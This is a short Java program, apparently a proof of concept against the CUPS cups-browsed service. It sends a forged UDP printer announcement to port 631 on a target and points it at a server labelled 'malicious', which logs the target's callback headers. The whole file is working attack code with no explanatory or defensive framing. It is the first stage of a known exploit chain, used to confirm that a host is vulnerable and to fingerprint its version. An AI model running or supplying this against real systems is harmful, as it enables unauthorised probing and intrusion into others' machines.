package com.fresco;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import com.sun.net.httpserver.HttpServer;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

public class Cups2 {
	public static String HOST_TARGET = "localhost";
	public static int PORT_TARGET = 631;
	public static String HOST_MALICIOUS = "localhost";
	public static int PORT_MALICIOUS = 6789;
	public static String PRINTER_LOCATION = "\"Office HQ\"";
	public static String PRINTER_INFO = "\"Printer\"";

	public static void main(String[] args) throws IOException {

		createServer();

		try (var socketUDP = new DatagramSocket()) {
			var message = "0 3 http://%s:%d/printers/myprinter %s %s".formatted(HOST_MALICIOUS, PORT_MALICIOUS,
					PRINTER_LOCATION, PRINTER_INFO);
			var buffer = message.getBytes();
			var ipTarget = InetAddress.getByName(HOST_TARGET);
			var req = new DatagramPacket(buffer, buffer.length, ipTarget, PORT_TARGET);
			System.out.println("Send message");
			socketUDP.send(req);
		}
	}

	private static void createServer() {
		try {
			var server = HttpServer.create(new InetSocketAddress(HOST_MALICIOUS, PORT_MALICIOUS), 0);
			server.createContext("/printers/myprinter", new PrinterHttpHandler());
			server.start();
		} catch (IOException e) {
			System.err.println(e.getMessage());
		}
	}

	static class PrinterHttpHandler implements HttpHandler {
		@Override
		public void handle(HttpExchange exchange) throws IOException {
			var headers = exchange.getRequestHeaders();
			var userAgent = headers.getFirst("User-agent");
			System.out.println("User-agent: " + userAgent);
			var date = headers.getFirst("Date");
			System.out.println("Date:       " + date);

		}
	}
}
